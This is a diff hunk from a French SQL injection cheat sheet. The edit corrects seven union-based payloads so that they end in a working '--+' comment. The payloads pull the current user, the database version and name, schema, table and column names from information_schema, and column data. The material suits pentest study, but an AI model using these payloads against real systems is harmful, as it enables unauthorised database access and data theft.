@@ -181,43 +181,43 @@ and 1= (select Nom_colonne from Nom_colonne limit 1)
    1) Exemples de commandes courantes utilisées dans l'injection SQL : 
       - Afficher l'utilisateur actuel 
 ```sql
-union select 1, (select user ())–+
+union select 1, (select user ())--+
 ```
  
 
       - Visualisation de la version de la base de données 
 ```sql
-union select 1, (select version ())–+
+union select 1, (select version ())--+
 ```
  
 
       - Affichage du nom de la base de données actuelle 
 ```sql
-union select 1, (select database ())–+
+union select 1, (select database ())--+
 ```
  
 
       - Voir tous les noms de bases de données 
 ```sql
-union select 1, (select group_concat (schema_name) from information_schema.schemata)–+
+union select 1, (select group_concat (schema_name) from information_schema.schemata)--+
 ```
  
 
       - Afficher tous les noms de tables d'une base de données 
 ```sql
-union select 1, (select group_concat (table_name) from information_schema.tables where table_schema='nom de la base de données')–+
+union select 1, (select group_concat (table_name) from information_schema.tables where table_schema='nom de la base de données')--+
 ```
  
 
       - Afficher toutes les colonnes d'un tableau 
 ```sql
-union select 1, (select group_concat (column_name) from information_schema.columns where table_name='nom de la table')–+
+union select 1, (select group_concat (column_name) from information_schema.columns where table_name='nom de la table')--+
 ```
  
 
       - Afficher toutes les données d'une colonne 
 ```sql
-union select 1, (select group_concat (colonne) from nom_table)–+
+union select 1, (select group_concat (colonne) from nom_table)--+
 ```
  
 
